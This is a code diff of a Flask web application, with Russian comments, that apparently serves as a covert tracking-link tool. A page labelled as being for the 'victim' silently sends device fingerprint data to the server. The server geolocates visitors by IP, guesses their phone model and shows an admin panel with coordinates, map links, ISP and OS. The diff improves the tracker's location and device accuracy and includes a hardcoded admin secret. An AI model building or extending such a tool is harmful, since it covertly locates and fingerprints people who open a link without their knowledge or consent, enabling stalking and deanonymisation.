@@ -7,7 +7,7 @@ UPLOAD_FOLDER = 'static/uploads'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 DB = 'db.sqlite'
 
-# ========== СЕКРЕТНЫЙ КЛЮЧ (измените при необходимости) ==========
+# ========== СЕКРЕТНЫЙ КЛЮЧ ==========
 ADMIN_SECRET = "18iwixjwi199woxk"
 
 def init_db():
@@ -79,7 +79,7 @@ def get_real_ip():
     return request.remote_addr
 
 def get_geo_info(ip):
-    """Определение геолокации через ipapi.co (точность до 500 м, 1000 запросов/день бесплатно)"""
+    """Город из ip-api.com, координаты и оператор из ipapi.co (если доступен)"""
     result = {
         'city': '',
         'country': '',
@@ -87,30 +87,9 @@ def get_geo_info(ip):
         'loc': '',
         'org': '',
         'timezone': '',
-        'postal': '',
-        'source': 'none'
+        'source': 'ip-api.com'
     }
-    # Пробуем ipapi.co
-    try:
-        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=3)
-        if resp.status_code == 200:
-            data = resp.json()
-            if 'error' not in data:
-                result['city'] = data.get('city', '')
-                result['country'] = data.get('country_name', '')
-                result['region'] = data.get('region', '')
-                loc = data.get('latitude', '')
-                if loc and data.get('longitude'):
-                    result['loc'] = f"{data.get('latitude')},{data.get('longitude')}"
-                result['org'] = data.get('org', '')
-                result['timezone'] = data.get('timezone', '')
-                result['postal'] = data.get('postal', '')
-                result['source'] = 'ipapi.co'
-                return result
-    except:
-        pass
-
-    # Запасной вариант: ip-api.com (город, без координат)
+    # Базовые данные через ip-api.com (город, страна)
     try:
         resp = requests.get(f'http://ip-api.com/json/{ip}?fields=city,country,regionName,timezone', timeout=3)
         if resp.status_code == 200:
@@ -120,16 +99,32 @@ def get_geo_info(ip):
                 result['country'] = data.get('country', '')
                 result['region'] = data.get('regionName', '')
                 result['timezone'] = data.get('timezone', '')
-                result['source'] = 'ip-api.com'
-                # loc не заполняем, т.к. нет координат
+    except:
+        pass
+
+    # Дополнительные данные (координаты, оператор) через ipapi.co
+    try:
+        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=3)
+        if resp.status_code == 200:
+            data = resp.json()
+            if 'error' not in data:
+                lat = data.get('latitude')
+                lon = data.get('longitude')
+                if lat and lon:
+                    result['loc'] = f"{lat},{lon}"
+                if data.get('org'):
+                    result['org'] = data['org']
+                if not result['city'] and data.get('city'):
+                    result['city'] = data['city']
+                if not result['country'] and data.get('country_name'):
+                    result['country'] = data['country_name']
+                result['source'] += ' + ipapi.co'
     except:
         pass
     return result
 
-# ========== БАЗА DPI ДЛЯ ОПРЕДЕЛЕНИЯ МОДЕЛИ ==========
-# Формат: (ширина, высота, плотность) -> (бренд, модель)
+# ========== БАЗА DPI ==========
 DEVICE_DB = {
-    # iPhone
     (1170, 2532, 3.0): ('Apple', 'iPhone 14 Pro / 15 Pro'),
     (1179, 2556, 3.0): ('Apple', 'iPhone 15 Pro Max'),
     (1125, 2436, 3.0): ('Apple', 'iPhone X / XS / 11 Pro'),
@@ -137,49 +132,36 @@ DEVICE_DB = {
     (828, 1792, 2.0): ('Apple', 'iPhone XR / 11'),
     (750, 1334, 2.0): ('Apple', 'iPhone 6/7/8 / SE2/SE3'),
     (1080, 1920, 2.0): ('Apple', 'iPhone 6 Plus / 7 Plus / 8 Plus'),
-    (375, 812, 3.0): ('Apple', 'iPhone X (логическое)'),  # для некоторых случаев
-    # Samsung Galaxy
     (1080, 2340, 3.0): ('Samsung', 'Galaxy S21/S22/S23 (базовый)'),
     (1440, 3040, 3.0): ('Samsung', 'Galaxy S21+/S22+/S23+'),
     (1440, 3088, 3.0): ('Samsung', 'Galaxy S21 Ultra / S22 Ultra / S23 Ultra'),
     (1080, 2400, 3.0): ('Samsung', 'Galaxy A52/A53/A54'),
     (720, 1600, 2.0): ('Samsung', 'Galaxy A12/A13'),
-    # Google Pixel
     (1080, 2400, 2.75): ('Google', 'Pixel 7 / 8'),
     (1440, 3120, 3.0): ('Google', 'Pixel 7 Pro / 8 Pro'),
     (1080, 2340, 2.5): ('Google', 'Pixel 6'),
     (1440, 3120, 2.5): ('Google', 'Pixel 6 Pro'),
-    # Xiaomi
     (1080, 2400, 3.0): ('Xiaomi', 'Redmi Note 10/11/12'),
     (1080, 2340, 3.0): ('Xiaomi', 'Xiaomi 11/12'),
     (1440, 3200, 3.0): ('Xiaomi', 'Xiaomi 12 Pro / 13 Pro'),
     (720, 1600, 2.0): ('Xiaomi', 'Redmi 9/10'),
-    # OnePlus
     (1080, 2400, 3.0): ('OnePlus', 'OnePlus 9/10/11'),
     (1440, 3216, 3.0): ('OnePlus', 'OnePlus 10 Pro/11 Pro'),
-    # Huawei
     (1080, 2400, 3.0): ('Huawei', 'P30/P40'),
     (1440, 3120, 3.0): ('Huawei', 'Mate 40 Pro'),
 }
 
 def guess_device_by_screen(screen_str, dpr):
-    """По строке screen вида 'WxHxD' и плотности (devicePixelRatio) угадывает модель"""
     try:
         parts = screen_str.split('x')
         if len(parts) >= 2:
             w = int(parts[0])
             h = int(parts[1])
-            # Для некоторых устройств ширина и высота могут быть перепутаны, нормализуем
             if w < h:
                 w, h = h, w
-            # Ищем в базе (с допуском)
-            best_match = None
             for (bw, bh, bdpr), (brand, model) in DEVICE_DB.items():
                 if abs(w - bw) <= 5 and abs(h - bh) <= 5 and abs(dpr - bdpr) <= 0.1:
-                    best_match = (brand, model)
-                    break
-            if best_match:
-                return best_match
+                    return brand, model
     except:
         pass
     return None, None
@@ -319,7 +301,7 @@ def upload(secret):
     </html>
     ''', link=link, uid=uid, original_name=original_name, mime_type=mime_type, secret=secret, STYLES=STYLES)
 
-# ========== СТРАНИЦА ДЛЯ ЖЕРТВЫ (без секрета) ==========
+# ========== СТРАНИЦА ДЛЯ ЖЕРТВЫ ==========
 TRACK_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -354,7 +336,6 @@ TRACK_PAGE_TEMPLATE = """
     </div>
     <script>
     (function() {
-        // Передаём на сервер screen и devicePixelRatio для определения модели
         const data = {
             uid: "{{ uid }}",
             screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
@@ -492,7 +473,7 @@ def track(uid):
                                   uid=uid, filename=filename, original_name=original_name, mime_type=mime_type,
                                   title=title, custom_text=text, bg_color=bg)
 
-# ========== СБОР ДАННЫХ (с парсингом User-Agent и определением модели по DPI) ==========
+# ========== СБОР ДАННЫХ ==========
 @app.route('/collect', methods=['POST'])
 def collect():
     data = request.get_json()
@@ -512,12 +493,11 @@ def collect():
     device_model_ua = parsed_ua.device.family
     device_brand_ua = parsed_ua.device.brand
     
-    # Определение модели по DPI (экран и плотность)
+    # Определение модели по DPI
     screen_str = data.get('screen', '')
     dpr = data.get('dpr', 1)
     brand_dpi, model_dpi = guess_device_by_screen(screen_str, dpr)
     
-    # Выбираем более точную модель (если DPI определил, используем его, иначе из User-Agent)
     if model_dpi:
         device_model = model_dpi
         device_brand = brand_dpi if brand_dpi else device_brand_ua
@@ -525,7 +505,6 @@ def collect():
         device_model = device_model_ua
         device_brand = device_brand_ua
     
-    # Если модель не определена, пробуем извлечь из User-Agent вручную
     if not device_model or device_model == 'Other':
         if 'iPhone' in ua:
             match = re.search(r'iPhone(\d+,\d+)', ua)
@@ -543,10 +522,8 @@ def collect():
     if not device_brand:
         device_brand = 'Неизвестно'
     
-    # Оператор из гео
     operator = geo.get('org', '')
     
-    # Добавляем новые поля в data
     data['os_version'] = os_version
     data['device_model'] = device_model
     data['device_brand'] = device_brand
@@ -560,7 +537,7 @@ def collect():
     conn.close()
     return jsonify({"status": "ok"})
 
-# ========== СТРАНИЦА ЛОГОВ (админка) ==========
+# ========== СТРАНИЦА ЛОГОВ ==========
 @app.route('/admin/<secret>/logs')
 @require_secret
 def admin_logs(secret):
@@ -634,34 +611,25 @@ def admin_logs_detail(secret, num):
     else:
         for ip, ua, city, fp, t in logs:
             html += f"<div class='log-entry'><span class='time'>{time.ctime(t)}</span><br>IP: {ip}<br>"
-            html += f"Город: {city}<br>"
+            # Город из базы (если есть)
+            city_display = city if city else 'Неизвестно'
+            html += f"<b>Город:</b> {city_display}<br>"
             if fp:
                 try:
                     fp_data = json.loads(fp)
-                    # Геолокация (дополнительная)
                     geo = fp_data.get('geo', {})
-                    if geo and geo.get('source') != 'none':
-                        html += "<div class='geo-info'><b>🌍 Дополнительная геолокация:</b><br>"
-                        if geo.get('country'):
-                            html += f"Страна: {geo.get('country')}<br>"
-                        if geo.get('region'):
-                            html += f"Регион: {geo.get('region')}<br>"
-                        if geo.get('city'):
-                            html += f"Город: {geo.get('city')}<br>"
-                        if geo.get('loc'):
-                            html += f"Координаты: {geo['loc']}<br>"
-                        if geo.get('org'):
-                            html += f"Провайдер (оператор): {geo['org']}<br>"
-                        if geo.get('timezone'):
-                            html += f"Часовой пояс: {geo['timezone']}<br>"
-                        html += f"Источник: {geo.get('source', 'неизвестно')}<br>"
-                        html += "</div>"
-                    # Новые поля: ОС, модель, бренд, оператор
+                    # Координаты и оператор (из geo)
+                    loc = geo.get('loc')
+                    if loc:
+                        maps_link = f"https://www.google.com/maps?q={loc}"
+                        html += f"<b>Координаты:</b> {loc} <a href='{maps_link}' target='_blank'>(карта)</a><br>"
+                    org = geo.get('org')
+                    if org:
+                        html += f"<b>Оператор/провайдер:</b> {org}<br>"
+                    # Остальные поля
                     html += f"<b>Версия ОС:</b> {fp_data.get('os_version', 'неизвестно')}<br>"
                     html += f"<b>Модель устройства:</b> {fp_data.get('device_model', 'неизвестно')}<br>"
                     html += f"<b>Бренд:</b> {fp_data.get('device_brand', 'неизвестно')}<br>"
-                    html += f"<b>Оператор (из ip):</b> {fp_data.get('operator', 'неизвестно')}<br>"
-                    # Остальные данные
                     html += f"<b>Экран:</b> {fp_data.get('screen', '')}<br>"
                     html += f"<b>Плотность пикселей:</b> {fp_data.get('dpr', '')}<br>"
                     html += f"<b>Часовой пояс:</b> {fp_data.get('timezone', '')}<br>"
@@ -700,7 +668,7 @@ def admin_logs_detail(secret, num):
     """
     return html
 
-# ========== ОЧИСТКА ЛОГОВ (админка) ==========
+# ========== ОЧИСТКА ЛОГОВ ==========
 @app.route('/admin/<secret>/clear_logs/<uid>', methods=['POST'])
 @require_secret
 def admin_clear_logs(secret, uid):
@@ -723,7 +691,7 @@ def admin_clear_logs(secret, uid):
     </html>
     """
 
-# ========== ПОЛНОЕ УДАЛЕНИЕ ССЫЛКИ (админка) ==========
+# ========== ПОЛНОЕ УДАЛЕНИЕ ССЫЛКИ ==========
 @app.route('/admin/<secret>/delete_link', methods=['POST'])
 @require_secret
 def admin_delete_link(secret):
@@ -743,7 +711,7 @@ def admin_delete_link(secret):
     conn.close()
     return redirect(f'/admin/{secret}/logs')
 
-# ========== ИЗМЕНЕНИЕ АЛИАСА (админка) ==========
+# ========== ИЗМЕНЕНИЕ АЛИАСА ==========
 @app.route('/admin/<secret>/update_slug', methods=['POST'])
 @require_secret
 def admin_update_slug(secret):
@@ -761,7 +729,7 @@ def admin_update_slug(secret):
     conn.close()
     return redirect(f'/admin/{secret}/logs/{uid}')
 
-# ========== ДАШБОРД (админка) ==========
+# ========== ДАШБОРД ==========
 @app.route('/admin/<secret>/dashboard')
 @require_secret
 def admin_dashboard(secret):
